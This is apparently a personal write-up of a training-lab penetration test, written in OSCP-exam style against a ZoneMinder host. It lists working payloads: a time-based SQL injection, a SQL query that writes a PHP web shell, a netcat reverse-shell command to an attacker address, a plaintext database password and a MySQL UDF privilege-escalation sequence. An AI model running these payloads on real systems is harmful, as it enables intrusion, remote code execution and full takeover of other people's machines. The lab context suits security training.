# System Information
OS: Ubuntu
IP: 192.168.112.52

---
# Service Enumeration

## 21/tcp FTP
vsftpd 3.0.3

guessed:
- anonymous:anonymous
- pebbles:pebbles

## 22/tcp SSH
OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

guessed:
- anonymous:anonymous
- pebbles:pebbles

## 80/tcp HTTP

Apache/2.4.18

Nikto points out ZMSESSID cookie from /zm.

![[Pasted image 20260827171911.png]]

![[Pasted image 20260827172009.png]]

SQLi in 1.29/1.30?
https://www.exploit-db.com/exploits/41239

By posting `view=request&request=log&task=query&limit=100%3b(SELECT+*+FROM+(SELECT(SLEEP(5)))OQkj)%23%26minTime%3d1466674406.084434` to /zm/index.php, it seems that it's indeed vulnerable to SQLi, as the server waits 5 seconds before responding, in accordance with our injected SLEEP command.

![[Pasted image 20260827172840.png]]


Can we write a webshell into one of the other running webroots to gain RCE?

`SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"`

->
```
view=request&request=log&task=query&limit=100%3bSELECT+"<%3fphp+system($_GET['cmd'])%3b%3f>"+INTO+OUTFILE+"/var/www/html/shell.php"
```

![[Pasted image 20260827173855.png]]


Now make requests to `http://$IP:3305/shell.php`:

![[Pasted image 20260827174007.png]]




## 3305/tcp Service

## 8080/tcp HTTP

# Initial Access

(found port 443 to be blocked by target firewall)

`curl http://$IP:3305/shell.php -G --data-urlencode 'cmd=busybox nc 192.168.45.194 80 -e /bin/bash'`

Land with shell was www-data.

# Privilege Escalation

`ls -al` shows our shell was written as root...

![[Pasted image 20260827174334.png]]

`msyql --version` shows 5.7.30.

`/etc/zm/zm.conf` contains valid db creds:
root:ShinyLucentMarker361

Find for privilege escalation with this version:
https://www.exploit-db.com/exploits/1518

Download exploit, rename to raptor_udf2.c. Follow instructions from comments in the source code:

`gcc -g -c raptor_udf2.c; gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

Upload rapdor_udf2.so to target in /tmp.
Create bash reverse shell script at /tmp/revshell.sh.

In mysql as root:
```
mysql -u root -pShinyLucentMarker361
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('/bin/bash /tmp/revshell.sh');
```

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260827191616.png]]

